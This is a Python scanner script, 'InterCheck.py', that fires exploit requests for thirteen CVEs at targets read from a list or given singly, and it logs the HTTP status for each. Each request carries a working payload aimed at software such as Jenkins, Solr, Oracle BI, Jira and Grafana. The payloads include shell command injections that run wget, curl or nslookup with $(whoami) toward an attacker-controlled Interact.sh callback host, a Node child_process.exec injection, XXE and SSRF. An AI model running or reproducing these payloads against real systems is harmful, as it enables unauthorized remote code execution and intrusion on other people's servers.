import argparse
import requests
from termcolor import colored
import os

def print_help():
help_text = """
InterCheck.py - A tool to check for specific CVEs using Interact.sh endpoint

Usage:
python3 intercheck.py -l targets.txt -sh your-interact-endpoint -o results.txt
python3 intercheck.py -t target-hostname -sh your-interact-endpoint -o results.txt

Options:
-l, --list        File containing list of IPs/hostnames
-t, --target      Single hostname/IP
-sh, --interact   Interact.sh endpoint (required)
-o, --output      Output file (default: output.txt)
-h, --help        Show this help message and exit

Description:
This tool checks specified targets for known CVEs using provided Interact.sh endpoints. It outputs the results, including HTTP status codes, to a file and prints them to the console with color-coded status.
"""
print(help_text)

def check_vulnerabilities(target, interact_endpoint):
cve_tests = [
{
"cve": "CVE-2021-33544",
"url": f"http://{target}/uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=aa&state=$(wget {interact_endpoint})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything"
},
{
"cve": "CVE-2018-1000600",
"url": f"http://{target}/securityrealm/user/admin/descriptorbyname/org.jenkinsci.plugins.github.config.githubtokencredentialscreator/createtokenbypassword?apiurl={interact_endpoint}"
},
{
"cve": "CVE-2019-2767",
"url": f"http://{target}/xmlpserver/convert?xml=<?xml+version=\"1.0\"+?><!doctype+r+[<!element+r+any+><!entity+%+sp+system+\"{interact_endpoint}/xxe.xml\">%sp;%param1;]>&_xf=excel&_xl=123&template=123"
},
{
"cve": "CVE-2021-27905",
"url": f"http://{target}/solr/db/replication?command=fetchindex&masterurl={interact_endpoint}:80/xxxx&wt=json&httpbasicauthuser=aaa&httpbasicauthpassword=bbb"
},
{
"cve": "CVE-2017-12629",
"url": f"http://{target}/solr/select?qt=/config#&&shards=127.0.0.1:8984/solr&stream.body={{\"add-listener\":{{\"event\":\"postcommit\",\"name\":\"nuclei\",\"class\":\"solr.runExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"$@|sh\",\".\",\"echo\",\"nslookup\",\"$(whoami).{interact_endpoint}\"]}}}}&wt=json&isShard=true&q=apple"
},
{
"cve": "CVE-2021-32819",
"url": f"http://{target}/?defaultFilter=e')); let require = global.require || global.process.mainModule.constructor._load; require('child_process').exec('curl {interact_endpoint}');"
},
{
"cve": "CVE-2017-9506",
"url": f"http://{target}/plugins/servlet/oauth/users/icon-uri?consumeruri={interact_endpoint}"
},
{
"cve": "CVE-2018-15517",
"url": f"http://{target}/index.php/system/mailconnect/host/{interact_endpoint}/port/80/secure"
},
{
"cve": "CVE-2021-27886",
"url": f"http://{target}/api/container/command?container=&command=;curl {interact_endpoint}"
},
{
"cve": "CVE-2020-13379",
"url": f"http://{target}/avatar/test?d=redirect.rhynorater.com?;/bp.blogspot.com/{interact_endpoint}"
},
{
"cve": "CVE-2009-4223",
"url": f"http://{target}/adm/krgourl.php?document_root={interact_endpoint}"
},
{
"cve": "CVE-2012-1301",
"url": f"http://{target}/umbraco/feedproxy.aspx?url={interact_endpoint}"
},
{
"cve": "CVE-2019-18394",
"url": f"http://{target}/getfavicon?host={interact_endpoint}"
}
]

results = []
for test in cve_tests:
try:
response = requests.get(test["url"], timeout=5)
results.append((test["cve"], response.status_code, None))
except requests.RequestException as e:
results.append((test["cve"], None, str(e)))

return results

def main():
parser = argparse.ArgumentParser(description="Check for specific CVEs using Interact.sh endpoint", add_help=False)
parser.add_argument("-l", "--list", type=str, help="File containing list of IPs/hostnames")
parser.add_argument("-t", "--target", type=str, help="Single hostname/IP")
parser.add_argument("-sh", "--interact", type=str, required=True, help="Interact.sh endpoint")
parser.add_argument("-o", "--output", type=str, default="output.txt", help="Output file")
parser.add_argument("-h", "--help", action="store_true", help="Show help message and exit")

args = parser.parse_args()

if args.help:
print_help()
return

if not (args.list or args.target):
print_help()
return

targets = []
if args.list:
if os.path.isfile(args.list):
with open(args.list, "r") as file:
targets = [line.strip() for line in file.readlines()]
else:
print(colored(f"Error: File {args.list} does not exist.", "red"))
return
elif args.target:
targets = [args.target]
else:
print(colored("Error: Either --list or --target must be specified.", "red"))
return

interact_endpoint = args.interact
output_file = args.output

with open(output_file, "w") as outfile:
for target in targets:
if not target:
continue
results = check_vulnerabilities(target, interact_endpoint)
for cve, status_code, error in results:
if status_code == 200:
message = colored(f"{target} - {status_code} - {cve}", "green")
else:
message = colored(f"{target} - Failed - {cve}", "red")
print(message)
outfile.write(f"{target} - {status_code if status_code else 'Failed'} - {cve}\n")

if __name__ == "__main__":
main()
